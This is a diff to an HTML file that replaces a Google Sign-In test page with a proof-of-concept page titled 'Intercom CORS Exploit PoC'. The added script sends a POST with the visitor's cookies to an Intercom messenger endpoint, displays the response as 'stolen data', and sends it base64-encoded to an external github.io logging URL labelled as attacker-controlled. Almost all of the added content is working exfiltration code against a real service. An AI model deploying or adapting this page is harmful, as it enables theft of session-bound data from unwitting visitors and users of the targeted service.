@@ -1,28 +1,38 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Google Sign-In Test</title>
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
-    <script>
-      function handleCredentialResponse(response) {
-        console.log("ID Token: ", response.credential);
-      }
+<head>
+  <title>Intercom CORS Exploit PoC</title>
+</head>
+<body>
+  <h1>Testing CORS Misconfiguration on Intercom</h1>
+  <pre id="output">Waiting for response...</pre>
 
-      window.onload = function () {
-        google.accounts.id.initialize({
-          client_id: "770751163800-8nqvvfpfvkg5n0u8rehr1fa56m2qsu62.apps.googleusercontent.com",
-          callback: handleCredentialResponse
-        });
+  <script>
+    // Endpoint being abused
+    const url = "https://api-iam.intercom.io/messenger/web/ping";
 
-        google.accounts.id.renderButton(
-          document.getElementById("g_id_signin"),
-          { theme: "outline", size: "large" }
-        );
-      };
-    </script>
-  </head>
-  <body>
-    <h2>Sign in with Google</h2>
-    <div id="g_id_signin"></div>
-  </body>
+    // Example POST body (minimal app_id to trigger JSON response)
+    const body = "app_id=zlmaz2pu&v=3";
+
+    fetch(url, {
+      method: "POST",
+      credentials: "include",   // include victim's cookies/session
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: body
+    })
+    .then(r => r.text())
+    .then(d => {
+      // Show stolen data in browser
+      document.getElementById("output").innerText = d;
+
+      // Exfiltrate to your GitHub server logs or another domain you control
+      fetch("https://russianyandexshop.github.io/view/log?data=" + btoa(d));
+    })
+    .catch(e => {
+      document.getElementById("output").innerText = "Error: " + e;
+    });
+  </script>
+</body>
 </html>
